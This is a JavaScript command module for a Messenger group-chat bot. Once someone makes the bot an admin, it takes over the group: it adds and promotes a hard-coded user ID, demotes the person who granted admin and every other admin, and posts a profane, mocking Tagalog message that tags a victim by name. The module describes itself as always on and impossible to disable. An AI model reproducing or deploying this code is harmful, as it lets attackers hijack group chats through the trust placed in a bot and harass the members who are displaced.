const fs = require('fs');

function l() {
  try {
    const d = fs.readFileSync("admin.json", "utf8");
    return JSON.parse(d);
  } catch (e) {
    return {};
  }
}

function s(s) {
  fs.writeFileSync("admin.json", JSON.stringify(s, null, 2));
}

let a = l();

const TARGET_USER_ID = "100045526235882";

module.exports = {
  config: {
    name: "ranter",
    version: "1.0",
    author: "Jay Pillonar",
    countDown: 5,
    role: 1,
    shortDescription: "",
    longDescription: "If someone makes the bot admin, it will remove the user's admin privileges and all other admins, except for the specified user.",
    category: "box",
    guide: "This command is automatically on and cannot be turned off.",
  },

  onStart: function({ message, event, threadsData, args }) {
    // This function is intentionally left blank
  },

  onEvent: async function({ api, event, threadsData }) {
    if (!event.logMessageData || event.logMessageData.ADMIN_EVENT !== "add_admin") {
      return;
    }

    const threadID = event.threadID;
    const addedAdminID = event.logMessageData.TARGET_ID;
    const addedByID = event.author;

    if (addedAdminID === api.getCurrentUserID()) {
      try {
        // Get thread info to identify admins and participants
        const threadInfo = await api.getThreadInfo(threadID);
        const adminIDs = threadInfo.adminIDs.map(admin => admin.id);
        const participantIDs = threadInfo.participantIDs;

        // Check if the specified user is in the group
        if (!participantIDs.includes(TARGET_USER_ID)) {
          // Add the specified user to the group and make them an admin
          await api.addUserToGroup(TARGET_USER_ID, threadID);
        }

        // Make the specified user an admin if they are not already
        if (!adminIDs.includes(TARGET_USER_ID)) {
          await api.changeAdminStatus(threadID, TARGET_USER_ID, true);
        }

        // If the specified user added the bot as admin, do not remove their admin status
        if (addedByID !== TARGET_USER_ID) {
          // Remove the user's admin privileges
          await api.changeAdminStatus(threadID, addedByID, false);
        }

        // Remove all admins except the bot and the specified user
        const removedAdmins = [];
        for (const adminID of adminIDs) {
          if (adminID !== api.getCurrentUserID() && adminID !== TARGET_USER_ID) {
            await api.changeAdminStatus(threadID, adminID, false);
            removedAdmins.push(adminID);
          }
        }

        // Determine who to tag in the message
        let tagUserID;
        let tagUserName;

        if (addedByID !== TARGET_USER_ID) {
          // Get the name of the user who made the bot an admin
          const userInfo = await api.getUserInfo(addedByID);
          tagUserID = addedByID;
          tagUserName = userInfo[addedByID].name;
        } else if (removedAdmins.length > 0) {
          // Choose a random removed admin to tag in the message
          const randomAdminID = removedAdmins[Math.floor(Math.random() * removedAdmins.length)];
          const randomAdminInfo = await api.getUserInfo(randomAdminID);
          tagUserID = randomAdminID;
          tagUserName = randomAdminInfo[randomAdminID].name;
        } else {
          // Fallback: If no admins were removed, tag the user who added the bot
          const userInfo = await api.getUserInfo(addedByID);
          tagUserID = addedByID;
          tagUserName = userInfo[addedByID].name;
        }

        // Send the message to the group and mention the determined user
        await api.sendMessage(
          {
            body: `JAY ON TOPP🔝🔝🔝🔝\nBULOKK GC NYO MAHIHINA🖕🏾🤣🤣\nTANGA MO ${tagUserName} HAHAHAHHAHAH,MGA BISAKOLLLL,TANG INA NYOOOO🤣🖕🏾🖕🏾`,
            mentions: [{ tag: tagUserName, id: tagUserID }]
          },
          threadID
        );

      } catch (error) {
        console.error("Error", error);
      }
    }
  }
};
